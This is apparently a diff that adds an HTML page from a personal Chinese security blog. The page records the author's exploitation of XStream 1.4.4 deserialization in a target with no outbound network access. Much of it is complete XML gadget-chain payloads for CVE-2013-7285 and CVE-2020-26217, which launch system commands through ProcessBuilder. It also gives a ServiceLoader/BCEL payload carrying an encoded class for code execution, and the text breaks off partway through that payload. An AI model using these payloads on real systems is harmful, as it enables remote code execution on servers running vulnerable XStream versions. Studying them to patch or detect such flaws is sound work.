@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="tiehanhan" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      一次低版本xstream反序列化利用记录 
+      
+      
+      |
+    
+     daidaitiehanhan&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar.gif">
+    <link rel="icon" href="/images/avatar.gif">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.gif" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">tiehanhan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">一次低版本xstream反序列化利用记录</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-05-03 23:54:19
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>去年遇到一套代码，里面有一处xstream反序列化的触发点，直接拿网上的cve打都没成，后面看了下目标环境是xstream-1.4.4.jar，本地搭了个1.4.4的环境测试发现很多poc都用不了，分享一下当时遇到的坑点。(写文章的时候xstream最新版是1.4.17，现在xstream最新版是1.4.18，默认开启白名单，且1.4.17一口气出了14个CVE….新的CVE太多没有一个个仔细看过，下文可能出现哪里说得不严谨的地方，欢迎师傅们指正）</p>
+<h3 id="不出网用的CVE"><a href="#不出网用的CVE" class="headerlink" title="不出网用的CVE"></a>不出网用的CVE</h3><p>xstream的所有cve都可以在<a target="_blank" rel="noopener" href="https://x-stream.github.io/security.html">xstream官方</a>看到poc等细节，公开的CVE有很多种，可以说每个CVE就是一种新的gadget。ssrf,bcel,jndi,urlclassloader,系统命令执行等各种gadget都有，但当时那个目标不出网，国内环境懂的都懂…所以为了更好契合实战我们用的gadget最好能在不出网的情景通用，下文只介绍不出网环境下能用的gadget。</p>
+<h4 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h4><p>都是没有回显的</p>
+<h5 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE-2013-7285"></a>CVE-2013-7285</h5><p>影响版本:1.4.6及以前，1.4.10(由于1.4.10增设了白名单却因为疏忽把自己之前的黑名单默认没启用，白名单也不是默认启用的，所以导致EventHandler又可以重现江湖)</p>
+<p>细节点:</p>
+<ol>
+<li><p>首先poc用的是<code>&lt;dynamic-proxy&gt;</code>标签,即动态代理标签。</p>
+</li>
+<li><p>这个思路利用到的是<code>EventHandler.invoke---&gt;EventHandler.invokeInternal</code>，关键在<code>EventHandler.invokeInternal</code>中用到了反射机制来实现函数调用，而且类名是可控的，只是方法名有一定限制必须是无参或者只有一个参数且为Comparable类型</p>
+</li>
+<li><p>这里wh1t3p1g师傅给的利用大概有两种:</p>
+</li>
+</ol>
+<ul>
+<li>配置好cmd的ProcessBuilder，action填start</li>
+<li>配置好rmi url的JdbcRowSetImpl，action填getDatabaseMetaData，这里可以举一反三，主要思路就是可利用的getters(可以发现CVE-2021-21344就是用的JdbcRowSetImpl类的getDatabaseMetaData方法触发jndi注入，还有CVE-2021-21345是用com.sun.corba.se.impl.activation.ServerTableEntry的verify方法达到命令执行的效果)</li>
+</ul>
+<p>执行系统命令有好几种实现，有基于接口，有基于sorted-set，有基于tree-map，这里1.4.4的环境只有基于tree-map这种我测试通过。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>fookey<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foovalue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h5><p>影响版本:1.4.13及之前(1.4.4通过)</p>
+<p>使用率最高的POC，Springboot未授权里面有个xstream洞用的大部分公开脚本里面都是用的这个POC</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>-a<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="CVE-2021-39144"><a href="#CVE-2021-39144" class="headerlink" title="CVE-2021-39144"></a>CVE-2021-39144</h5><p><a target="_blank" rel="noopener" href="https://x-stream.github.io/CVE-2021-39144.html">https://x-stream.github.io/CVE-2021-39144.html</a></p>
+<p>1.4.17更新的gadget，1.4.4测试不通过</p>
+<h5 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE-2021-21345"></a>CVE-2021-21345</h5><p><a target="_blank" rel="noopener" href="https://x-stream.github.io/CVE-2021-21345.html">https://x-stream.github.io/CVE-2021-21345.html</a></p>
+<p>1.4.4测试不通过</p>
+<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><h5 id="ServiceFinder-LazyIterator"><a href="#ServiceFinder-LazyIterator" class="headerlink" title="ServiceFinder$LazyIterator"></a>ServiceFinder$LazyIterator</h5><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/204314">https://www.anquanke.com/post/id/204314</a></p>
+<p>影响:1.4.6–1.4.13(1.4.4测试不通过)</p>
+<p>wh1t3p1g师傅讲得很详细，也解释了为啥会报错class not found的原因以及解决方案，wh1t3p1师傅的大制作ysomap中可以直接用这个gadget生成xstream的poc，自己手动构造poc则<strong>需要额外关注bcel代码中可能会涉及到的class名并添加到classes标签里</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">&quot;java.util.ServiceLoader$LazyIterator&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">service</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loader</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&quot;hashtable&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&quot;java.lang.ClassLoader&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&quot;../..&quot;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">domains</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classes</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Throwable<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Throwable<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.io.IOException<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.io.IOException<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Thread<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Thread<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Exception<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Exception<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">classes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ignored__packages</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.SyntheticRepository&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">class__path</span>&gt;</span><span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">loader</span>&gt;</span>        <span class="tag">&lt;<span class="name">nextName</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$5dPMO$c2$40$Q$7d$L$z$8bK$b1$I$f8$fd$c9I$f0$m$H$bdI$bc$Y$3dhQ$T$I$9e$97$b2$91bmI$v$c6$7f$e4$99$93$c4$83$3f$c0$le$9c$$$a8$d1$d9$ec$cc$ce$9byo$s$fb$f1$f9$f6$O$e0$Y$V$81$y$96$FV$b0jB$db$7e$n$c9$d68$d69686$Z2$N$_$f0$e2S$86t$b5$d6a0$ce$c2$9eb$b0$j$_P$d7$e3$c7$ae$8a$da$b2$eb$TRtBW$fa$j$ZyI$3e$H$8d$b8$ef$8d$Y$b8$d3$f2$95$g$9e0d$h$ae$3f$d7$cb$b7b$e9$3e4$e5P$f7$d2D$G$d1$K$c7$91$ab$$$bc$84$x4$e7p$m$9f$a4$85$F$I$8e$z$L$db$d8$b1$b0$8b$3d$86RR$a8$fb2$b8$af$9f$3f$bbj$Y$7ba$c0$60j$SC$e1$b7z$d3$j$u7$fe$D$b5$fb$91$92$3dZ$c1$jG$91$K$e2$ef$bc$5c$ad9$ff$bbhis4$T5$aa$97$b5$O$w$e0$f4k$89$a5$c0$92$c5$c8$e7$u$3b$a2$c8$u$9a$H$af$60$T$5d$b6$c8$L$8a$80A$t$83$3c$bd$acY$T$WaS$cc$a2$f0$pp$ab$F$B$7b$8a$d4$5d$Z$e9$v$cc$X$YW$T$N$K$og$90$d6$92E$S$83$9e$9c$pT$90T$5eK$t$83$96$e8r$a4$9a$9c$ba$88X$d2p$f9$Lz$e4$Y$c6$f2$B$A$A<span class="tag">&lt;/<span class="name">nextName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span 